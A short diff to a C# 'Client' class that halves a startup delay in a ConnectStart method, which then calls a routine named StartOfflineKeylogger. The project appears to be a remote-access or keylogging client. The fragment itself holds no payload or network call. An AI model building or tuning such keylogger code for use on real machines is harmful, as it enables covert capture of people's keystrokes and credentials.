@@ -50,7 +50,7 @@ namespace Client
 
         public void ConnectStart()
         {
-            Thread.Sleep(250);
+            Thread.Sleep(125);
             if (!EntryClass.KeylogOn && Config.offKeylog != "False") 
             {
                 EntryClass.StartOfflineKeylogger();
